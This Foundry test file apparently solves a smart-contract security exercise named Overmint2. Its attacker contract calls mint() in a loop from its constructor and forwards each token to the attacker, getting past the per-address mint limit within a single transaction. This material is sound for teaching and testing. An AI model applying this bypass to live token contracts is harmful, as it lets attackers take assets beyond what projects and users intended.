// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {Overmint2} from "../src/Overmint2.sol";

pragma solidity ^0.8.0;

contract Overmint2Test is Test {
    Overmint2 overmintContract;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        overmintContract = new Overmint2();

        vm.deal(attacker, 3 ether);
    }

    function testOvermint2() public {
        uint256 currentNonce = vm.getNonce(attacker);

        vm.prank(attacker);
        new Overmint2Attacker(overmintContract);

        assertEq(overmintContract.balanceOf(attacker), 5);
        assert(vm.getNonce(attacker) < currentNonce + 2);
    }
}

contract Overmint2Attacker {
    Overmint2 public overmintContract;
    address public owner;

    uint256 enteredAmount;

    constructor(Overmint2 _overmintContract) {
        owner = msg.sender;
        overmintContract = _overmintContract;
        attack();
    }

    function attack() public {
        overmintContract.mint();

        for (uint256 i = 1; i < 6; i++) {
            overmintContract.mint();
            overmintContract.transferFrom(address(this), owner, i);
        }
    }
}
